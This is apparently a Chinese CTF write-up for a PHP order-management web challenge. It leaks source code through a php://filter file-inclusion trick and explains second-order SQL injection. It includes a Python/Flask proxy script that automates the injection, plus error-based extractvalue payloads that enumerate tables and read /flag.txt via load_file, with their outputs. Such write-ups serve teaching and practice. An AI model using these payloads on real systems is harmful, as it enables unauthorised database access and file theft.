![[Pasted image 20230103082652.png|500]]

---
首页长这样
![[Pasted image 20230103082624.png|1000]]

![[Pasted image 20230103085349.png]]
提示传递`file`查询
```php
/index.php?file=php://filter/read=convert.base64-encode/resource=index.php
```

```php
<?php

ini_set('open_basedir', '/var/www/html/');

// $file = $_GET["file"];
$file = (isset($_GET['file']) ? $_GET['file'] : null);
if (isset($file)){
    if (preg_match("/phar|zip|bzip2|zlib|data|input|%00/i",$file)) {
        echo('no way!');
        exit;
    }
    @include($file);
}
?>
```

```php
/index.php?file=php://filter/read=convert.base64-encode/resource=confirm.php
```

```php
<?php

require_once "config.php";
//var_dump($_POST);

if(!empty($_POST["user_name"]) && !empty($_POST["address"]) && !empty($_POST["phone"]))
{
    $msg = '';
    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
    $user_name = $_POST["user_name"];
    $address = $_POST["address"];
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }

    if($fetch->num_rows>0) {
        $msg = $user_name."已提交订单";
    }else{
        $sql = "insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)";
        $re = $db->prepare($sql);
        $re->bind_param("sss", $user_name, $address, $phone);
        $re = $re->execute();
        if(!$re) {
            echo 'error';
            print_r($db->error);
            exit;
        }
        $msg = "订单提交成功";
    }
} else {
    $msg = "信息不全";
}
?>
```

```php
/index.php?file=php://filter/read=convert.base64-encode/resource=search.php
```

```php
<?php

require_once "config.php"; 

if(!empty($_POST["user_name"]) && !empty($_POST["phone"]))
{
    $msg = '';
    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
    $user_name = $_POST["user_name"];
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ 
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }

    if (isset($fetch) && $fetch->num_rows>0){
        $row = $fetch->fetch_assoc();
        if(!$row) {
            echo 'error';
            print_r($db->error);
            exit;
        }
        $msg = "<p>姓名:".$row['user_name']."</p><p>, 电话:".$row['phone']."</p><p>, 地址:".$row['address']."</p>";
    } else {
        $msg = "未找到订单!";
    }
}else {
    $msg = "信息不全";
}
?>
```

```php
/index.php?file=php://filter/read=convert.base64-encode/resource=change.php
```

```php
<?php

require_once "config.php";

if(!empty($_POST["user_name"]) && !empty($_POST["address"]) && !empty($_POST["phone"]))
{
    $msg = '';
    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
    $user_name = $_POST["user_name"];
    $address = addslashes($_POST["address"]);
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }

    if (isset($fetch) && $fetch->num_rows>0){
        $row = $fetch->fetch_assoc();
        $sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'];
        $result = $db->query($sql);
        if(!$result) {
            echo 'error';
            print_r($db->error);
            exit;
        }
        $msg = "订单修改成功";
    } else {
        $msg = "未找到订单!";
    }
}else {
    $msg = "信息不全";
}
?>
```

```php
/index.php?file=php://filter/read=convert.base64-encode/resource=delete.php
```

```php
<?php

require_once "config.php";

if(!empty($_POST["user_name"]) && !empty($_POST["phone"]))
{
    $msg = '';
    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
    $user_name = $_POST["user_name"];
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ 
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }

    if (isset($fetch) && $fetch->num_rows>0){
        $row = $fetch->fetch_assoc();
        $result = $db->query('delete from `user` where `user_id`=' . $row["user_id"]);
        if(!$result) {
            echo 'error';
            print_r($db->error);
            exit;
        }
        $msg = "订单删除成功";
    } else {
        $msg = "未找到订单!";
    }
}else {
    $msg = "信息不全";
}
?>
```

```php
/index.php?file=php://filter/read=convert.base64-encode/resource=config.php
```

```php
<?php

ini_set("open_basedir", getcwd() . ":/etc:/tmp");

$DATABASE = array(

    "host" => "127.0.0.1",
    "username" => "root",
    "password" => "root",
    "dbname" =>"ctfusers"
);

$db = new mysqli($DATABASE['host'],$DATABASE['username'],$DATABASE['password'],$DATABASE['dbname']);
```

`change.php`中使用`addslashes`对`address`进行转义，但`confirm.php`却并未对`address`进行处理，旧的`address`在`change.php`中直接作为字符串拼接进查询，从而给注入创造了可能

这种攻击方式称为[二次注入](https://www.freebuf.com/articles/web/167089.html)

> 所谓二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。
> 二次注入是 SQL 注入的一种，但是比普通 SQL 注入利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。

> 二次注入的原理，在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。
> 在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成 SQL 的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。

由于使用了`print_r`回显报错信息，因此尝试使用报错注入

通过代理服务器简化请求
```python
import requests
from flask import Flask, request, Response

app = Flask(__name__)
url = 'f9d674ce-9af5-42ce-9d8d-47978f0e7add.node4.buuoj.cn:81'

@app.before_request
def before_request():
    data = request.data or request.form or None
    r = hack(data['address'])
    return Response(r, status=r.status_code)

def hack(address):
    confirm(address)
    r = change()
    delete()
    return r

def confirm(address):
    paramsPost = {'user_name': "1", 'phone': '18888888888', 'address': address}
    requests.post("http://{}/confirm.php".format(url), data=paramsPost)

def change():
    paramsPost = {'user_name': '1', 'phone': '18888888888', 'address': '123'}
    response = requests.post('http://{}/change.php'.format(url), data=paramsPost)
    return response

def delete():
    paramsPost = {'user_name': '1', 'phone': '18888888888'}
    requests.post("http://{}/delete.php".format(url), data=paramsPost)

app.run(port=80, debug=True)
```

```sql
address=1' where user_id=0^extractvalue(1,concat(0x5c,(select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctftraining'))))#
```

```
errorXPATH syntax error: '\FLAG_TABLE,news,users'
```

```sql
address=1' where user_id=0^extractvalue(1,concat(0x5c,(select(group_concat(column_name))from(information_schema.columns)where(table_name='FLAG_TABLE'))))#
```

```
errorXPATH syntax error: '\FLAG_COLUMN'
```

~~然后折腾半天发现原来`flag`在`/flag.txt`~~

```sql
address=1' where user_id=0^extractvalue(1,concat(0x5c,(select(load_file('/flag.txt')))))#
```

```
errorXPATH syntax error: '\flag{5a415f51-29a4-47e2-bd8e-18'
```

```sql
address=1' where user_id=0^extractvalue(1,concat(0x5c,(select(substr(load_file('/flag.txt'),32)))))#
```

```
errorXPATH syntax error: '\0d3ac4c6e3}
'
```

#Web #PHP #源码泄漏 #SQL注入 #报错注入 #二次注入 #代理 #伪协议 